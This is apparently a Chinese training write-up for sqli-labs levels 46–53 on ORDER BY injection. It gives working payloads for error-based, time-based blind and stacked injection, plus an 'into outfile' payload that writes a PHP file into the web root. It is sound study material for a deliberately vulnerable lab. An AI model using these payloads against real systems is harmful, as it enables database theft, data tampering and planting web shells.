# sqli-labs靶场(7)排序注入


sqli-labs靶场精简记录46-53

<!--more-->

### less-46 GET - Error based - Numeric - ORDER BY CLAUS

基于错误 GET 数字型排序注入

```
$id=$_GET['sort'];	
...
	$sql = "SELECT * FROM users ORDER BY $id";
	$result = mysql_query($sql);
```

使用新的参数sort，通过输入1，2，3表中出现不同数据

报错注入

```
?sort=(extractvalue(1,concat(0x7e,(select user()),0x7e)))#
```

延时注入

```
?sort= 1 and sleep(5)
```

写文件

```
?sort=1 into outfile "D:\\phpStudy\\WWW\\sqli-labs\\Less-46\\shell.php" lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+

#十六进制的  <?php phphinfo();?>
```

### Less-47 GET - Error based - String - ORDER BY CLAUS

基于错误 GET 字符型单引号排序注入

bypass

```
1' and (select 1 from (select count(*),concat_ws('-',(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)--+
```

tips

```
Less-46中，我们没有用注释符注释尾部是因为他是数字型，且注入的位置在 SQL 语句尾部，而字符型就必须注释，否则无法进行单引号的正常闭合
```

### Less-48 GET - Error based - Blind- Numeric- ORDER BY CLAUS

基于盲注 GET 数字型排序注入

同46，关闭了报错，无法使用报错注入，进行盲注

### Less49 GET - Error based - String- Blind - ORDER BY CLAUS

基于盲注 GET 字符型单引号排序注入

同47，关闭了报错，无法使用报错注入

时间盲注

```
1' and if(ascii(mid(database(),1,1))=115,1,sleep(1))--+
```

### Less - 50 GET - Error based - ORDER BY CLAUSE -numeric- Stacked injection

基于错误 GET 数字型排序堆叠注入

同46，可以使用updatexml进行报错注入。因为使用了mysqli_multi_query函数，还可以使用堆叠注入，也可以延时注入。

排序注入

```
(select 1 from (select count(*),concat_ws('-',(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)
1 and (updatexml(1,concat(0x7e,(select database())),0)) 
```

堆叠注入

```
1;insert into users(id,username,password) values(50,'Less50','123456')--+
```

### Less-51 GET - Error based - ORDER BY CLAUSE-Stri ng

基于错误 GET 字符型单引号排序堆叠注入

同50，单引号闭合，注释

payload

```
1' and (select 1 from (select count(*),concat_ws('-',(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)--+
1';insert into users values(51,'Less51','Less51')--+
```

### Less-52 GET - Blind based - ORDER BY CLAUSE -numeric- Stacked injection

基于布尔的GET 数字型盲注堆叠注入

同50，但数字型，可布尔盲注，延时注入，堆叠注入

堆叠注入

```
1;insert into users(id,username,password) values(52,'Less52','123456')--+
```

### Less-53 GET - Blind based - ORDER BY CLAUS string- Stacked injection

基于布尔的GET单引号字符型盲注堆叠注入

同51，字符型，单引号闭合，无报错显示，可堆叠注入和延时注入。
